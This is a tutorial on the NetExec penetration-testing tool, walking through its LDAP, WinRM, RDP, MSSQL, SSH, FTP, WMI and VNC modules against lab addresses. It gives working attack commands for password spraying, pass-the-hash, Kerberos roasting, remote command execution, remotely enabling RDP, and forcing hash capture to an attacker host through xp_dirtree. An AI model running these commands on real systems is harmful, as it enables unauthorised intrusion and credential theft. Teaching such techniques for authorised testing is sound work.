# LDAP, WinRM, RDP, MSSQL, SSH, and FTP Protocols in NXC

## LDAP Module

The LDAP module connects to Active Directory via LDAP (port 389) or LDAPS (port 636) for domain enumeration and querying.

### Basic LDAP Authentication

```bash
# Authenticate to LDAP
nxc ldap 192.168.1.10 -u jsmith -p 'Password123' -d CORP.LOCAL
```

**Example output:**
```
LDAP        192.168.1.10    389    DC01             [+] CORP.LOCAL\jsmith:Password123
```

### Domain Information Enumeration

```bash
# Get domain SID and functional level
nxc ldap 192.168.1.10 -u jsmith -p 'Password123'
```

### User Enumeration via LDAP

```bash
# Enumerate all domain users
nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --users
```

**Example output:**
```
LDAP        192.168.1.10    389    DC01             [+] CORP.LOCAL\jsmith:Password123
LDAP        192.168.1.10    389    DC01             [*] Total of records returned: 12
LDAP        192.168.1.10    389    DC01             Administrator                  Built-in account for administering
LDAP        192.168.1.10    389    DC01             Guest                          Built-in account for guest access
LDAP        192.168.1.10    389    DC01             krbtgt                         Key Distribution Center Service Account
LDAP        192.168.1.10    389    DC01             jsmith                         John Smith
LDAP        192.168.1.10    389    DC01             svc_sql                        SQL Service Account
LDAP        192.168.1.10    389    DC01             admin.jones                    Admin Sarah Jones
```

### Group Enumeration via LDAP

```bash
nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --groups
```

### Trust Enumeration

```bash
# Enumerate domain trusts
nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --trusted-for-delegation
```

This finds accounts trusted for unconstrained delegation — critical for privilege escalation.

### LDAP Queries

```bash
# Find all computers
nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --computers

# Get password policy
nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --password-policy

# Find accounts with adminCount=1
nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --admin-count

# Find users with password never expires
nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --password-not-required
```

### LDAP Signing Check

```bash
# Check if LDAP signing is required
nxc ldap 192.168.1.10 -u jsmith -p 'Password123' -M ldap-checker
```

### Kerberoasting and AS-REP Roasting (via LDAP)

```bash
# These use the LDAP protocol module
nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --kerberoasting kerberoast.txt
nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --asreproast asrep.txt
```

### LDAP with Kerberos Authentication

```bash
export KRB5CCNAME=/tmp/jsmith.ccache
nxc ldap dc01.corp.local -k --use-kcache --users
```

---

## WinRM Module

WinRM (Windows Remote Management) runs on port 5985 (HTTP) or 5986 (HTTPS). It enables PowerShell Remoting and is commonly enabled on servers.

### WinRM Authentication Check

```bash
# Check if credentials work for WinRM
nxc winrm 192.168.1.20 -u administrator -p 'Password123'
```

**Example output:**
```
WINRM       192.168.1.20    5985   WS01             [*] Windows 10 Build 19041 (name:WS01) (domain:CORP.LOCAL)
WINRM       192.168.1.20    5985   WS01             [+] CORP.LOCAL\administrator:Password123 (Pwn3d!)
```

The `(Pwn3d!)` flag for WinRM means the user can execute commands via PowerShell Remoting.

### WinRM Command Execution

```bash
# cmd.exe execution via WinRM
nxc winrm 192.168.1.20 -u administrator -p 'Password123' -x 'whoami /all'

# PowerShell execution via WinRM
nxc winrm 192.168.1.20 -u administrator -p 'Password123' -X 'Get-Process | Select-Object Name,Id'
```

**Example output:**
```
WINRM       192.168.1.20    5985   WS01             [+] CORP.LOCAL\administrator:Password123 (Pwn3d!)
WINRM       192.168.1.20    5985   WS01             corp\administrator
```

### WinRM with Hash (PTH)

```bash
nxc winrm 192.168.1.20 -u administrator -H '5f4dcc3b5aa765d61d8327deb882cf99'
```

### WinRM Access Requirements

To use WinRM, the user must be:
- A local administrator, OR
- A member of the "Remote Management Users" local group

### Scanning for WinRM Across a Network

```bash
# Find all hosts with WinRM enabled and check access
nxc winrm 192.168.1.0/24 -u administrator -p 'Password123'
```

---

## RDP Module

The RDP module checks Remote Desktop Protocol access on port 3389.

### RDP Access Check

```bash
nxc rdp 192.168.1.20 -u administrator -p 'Password123'
```

**Example output:**
```
RDP         192.168.1.20    3389   WS01             [+] CORP.LOCAL\administrator:Password123 (Pwn3d!)
```

`(Pwn3d!)` for RDP means the user can successfully authenticate via RDP.

### RDP with NLA Check

```bash
# Check if Network Level Authentication is required
nxc rdp 192.168.1.20 -u administrator -p 'Password123'
```

NXC will show whether NLA is enabled in the output — NLA requires valid credentials before the full RDP connection is established.

### RDP Brute Force / Spray

```bash
# Password spray against RDP
nxc rdp 192.168.1.0/24 -u users.txt -p 'Summer2024!' --continue-on-success
```

### Enabling RDP Remotely

```bash
# If you have admin access via SMB, enable RDP on the target
nxc smb 192.168.1.20 -u administrator -p 'Password123' -x 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'

# Open the firewall for RDP
nxc smb 192.168.1.20 -u administrator -p 'Password123' -x 'netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes'
```

### RDP Screenshot Module

```bash
# Take a screenshot of the RDP login screen
nxc rdp 192.168.1.20 -u administrator -p 'Password123' --screenshot
```

### Scanning for RDP Across a Network

```bash
# Find all hosts with RDP open
nxc rdp 192.168.1.0/24 -u '' -p ''
```

---

## MSSQL Module

The MSSQL module targets Microsoft SQL Server instances on port 1433.

### MSSQL Authentication

```bash
# SQL authentication (sa account)
nxc mssql 192.168.1.25 -u sa -p 'SQLPassword123!'

# Windows authentication
nxc mssql 192.168.1.25 -u jsmith -p 'Password123' -d CORP.LOCAL
```

**Example output:**
```
MSSQL       192.168.1.25    1433   SQL01            [+] CORP.LOCAL\jsmith:Password123
```

With sysadmin:
```
MSSQL       192.168.1.25    1433   SQL01            [+] CORP.LOCAL\sa:SQLPassword123! (Pwn3d!)
```

### MSSQL Query Execution

```bash
# Execute a SQL query
nxc mssql 192.168.1.25 -u sa -p 'SQLPassword123!' -q 'SELECT name FROM sys.databases'
nxc mssql 192.168.1.25 -u sa -p 'SQLPassword123!' -q 'SELECT @@version'
```

### xp_cmdshell — OS Command Execution

```bash
# Execute OS commands via xp_cmdshell
nxc mssql 192.168.1.25 -u sa -p 'SQLPassword123!' -x 'whoami'
```

**Example output:**
```
MSSQL       192.168.1.25    1433   SQL01            [+] CORP.LOCAL\sa:SQLPassword123! (Pwn3d!)
MSSQL       192.168.1.25    1433   SQL01            [*] Executing command via xp_cmdshell
MSSQL       192.168.1.25    1433   SQL01            nt service\mssqlserver
```

If xp_cmdshell is disabled, NXC will attempt to enable it (requires sysadmin).

### MSSQL Privilege Escalation

```bash
# Check if you can impersonate other users
nxc mssql 192.168.1.25 -u jsmith -p 'Password123' -M mssql_priv
```

### Linked Servers

```bash
# Enumerate linked servers
nxc mssql 192.168.1.25 -u sa -p 'SQLPassword123!' -q 'SELECT * FROM sys.servers'

# Execute via linked server
nxc mssql 192.168.1.25 -u sa -p 'SQLPassword123!' -q "EXEC ('whoami') AT [LINKED_SERVER]"
```

### Hash Stealing via MSSQL

```bash
# Force the SQL Server to authenticate to your server (capture hash with Responder)
nxc mssql 192.168.1.25 -u sa -p 'SQLPassword123!' -x "EXEC xp_dirtree '\\10.10.10.5\share'"
```

---

## SSH Module

The SSH module tests credentials against SSH services (port 22).

### SSH Authentication

```bash
nxc ssh 192.168.1.100 -u root -p 'toor'
```

**Example output:**
```
SSH         192.168.1.100   22     192.168.1.100    [+] root:toor
```

### SSH Command Execution

```bash
nxc ssh 192.168.1.100 -u root -p 'toor' -x 'id'
```

**Example output:**
```
SSH         192.168.1.100   22     192.168.1.100    [+] root:toor
SSH         192.168.1.100   22     192.168.1.100    uid=0(root) gid=0(root) groups=0(root)
```

### SSH Password Spray

```bash
nxc ssh 192.168.1.0/24 -u users.txt -p 'Summer2024!' --continue-on-success
```

### SSH Key Authentication

```bash
nxc ssh 192.168.1.100 -u root --key-file /path/to/id_rsa
```

---

## FTP Module

The FTP module checks FTP authentication on port 21.

### FTP Anonymous Access

```bash
nxc ftp 192.168.1.40 -u anonymous -p ''
```

**Example output:**
```
FTP         192.168.1.40    21     192.168.1.40     [+] anonymous:
```

### FTP Authentication

```bash
nxc ftp 192.168.1.40 -u ftpuser -p 'FTPPass123'
```

### FTP Spray Across Network

```bash
nxc ftp 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success
```

### FTP File Listing

```bash
# List files on FTP server
nxc ftp 192.168.1.40 -u ftpuser -p 'FTPPass123' --ls
```

---

## WMI Module

The WMI module uses Windows Management Instrumentation on port 135.

### WMI Authentication

```bash
nxc wmi 192.168.1.20 -u administrator -p 'Password123'
```

### WMI Command Execution

```bash
nxc wmi 192.168.1.20 -u administrator -p 'Password123' -x 'whoami'
```

### WMI Query

```bash
# Execute a WMI query
nxc wmi 192.168.1.20 -u administrator -p 'Password123' --wmi "SELECT * FROM Win32_OperatingSystem"
```

---

## VNC Module

The VNC module checks VNC authentication on port 5900.

### VNC Authentication

```bash
nxc vnc 192.168.1.50
nxc vnc 192.168.1.50 -p 'vncpassword'
```

### VNC Screen Capture

```bash
nxc vnc 192.168.1.50 --screenshot
```

---

## Protocol Selection Guide

| Scenario | Best Protocol | Why |
|----------|--------------|-----|
| Initial enumeration | SMB | Works unauthenticated, reveals OS/domain/signing |
| Domain user/group enum | LDAP | Most complete AD enumeration |
| Command execution (OPSEC) | WinRM | Clean PowerShell, good logging control |
| Command execution (compatibility) | SMB | Works everywhere SMB is open |
| SQL Server attack | MSSQL | Direct SQL/xp_cmdshell access |
| Linux targets | SSH | Only option for Linux |
| GUI access | RDP | When you need interactive desktop |
| Credential spraying | SMB or LDAP | Fastest, most targets |
